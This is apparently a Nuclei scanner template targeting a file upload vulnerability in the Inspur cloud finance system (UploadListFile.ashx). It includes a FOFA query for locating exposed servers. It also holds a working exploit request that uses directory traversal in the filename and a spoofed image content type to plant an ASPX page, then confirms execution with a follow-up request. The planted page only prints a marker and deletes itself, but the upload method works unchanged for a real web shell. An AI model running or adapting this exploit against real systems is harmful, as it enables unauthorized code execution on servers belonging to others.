id: inspur-cloud-finance-uploadlistfile

info:
  name: "浪潮云财务系统 UploadListFile 接口文件上传漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="/cwbase/web/scripts/jquery.js" || icon_hash="-1341069524"
          浪潮云财务系统 UploadListFile 接口未正确校验文件上传权限，攻击者可利用该接口实现非授权文件存储，导致服务器端恶意代码执行或数据篡改，进而危及系统完整性与数据机密性。
  tags: 浪潮云财务系统

flow: |
  http(1) && http(2)

http:
- raw:
  - |
    POST /cwbase/EP/ListContent/UploadListFile.ashx?uptype=attslib&keyid=1&key1=1&key2=1 HTTP/1.1
    Host: {{Hostname}}
    Accept: /
    Accept-Encoding: gzip, deflate, br
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Connection: close
    Content-Type: multipart/form-data; boundary=---------------------------rww5upkbw6ctf0tu5hye
     
    -----------------------------rww5upkbw6ctf0tu5hye
    Content-Disposition: form-data; name="file"; filename="../../../../../../NTest.aspx"
    Content-Type: image/png
     
    <%@ Page Language="C#"%><% Response.Write("NdayTest"); System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
    -----------------------------rww5upkbw6ctf0tu5hye--
- raw:
  - |
    GET /cwbase/NTest.aspx HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'NdayTest'
